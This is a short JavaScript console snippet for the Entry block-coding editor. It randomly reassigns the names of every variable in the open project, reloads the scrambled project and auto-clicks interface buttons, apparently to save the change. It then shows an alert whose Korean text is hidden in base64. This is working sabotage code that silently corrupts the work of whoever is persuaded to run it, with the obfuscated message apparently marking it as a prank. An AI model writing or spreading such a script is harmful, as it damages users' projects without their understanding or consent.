function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

project = Entry.exportProject()
names = []

for (let i of project.variables) {
    names.push(i.name)
}

for (let i of project.variables) {
    var j = getRandomInt(0, names.length - 1)
    i.name = names[j]
    names.splice(j, 1)
}

Entry.clearProject()
Entry.loadProject(project)

document.querySelector(".css-9qnihu").click()
setTimeout(() => {
    document.querySelector(".item__p5HkM").click()
}, 100)

alerting = setInterval(() => {
    if (document.querySelector(".entry-modal-confirm")) {
        alert(decodeURIComponent(escape(atob("7J20IOyekeydmCDrs4DsiJgg7J2066aE7J2EIOuwlOq/lOuGqOyKteuLiOuLpC4K7KCcIOyVjOu5oOuKlCDslYTri4jqs6AsIOyXlOydtOyXkCDqsJnsnbQg7L2U65Oc66W8IOu/jOugpOuztOyjoA=="))))
        clearInterval(alerting)
    }
}, 100)
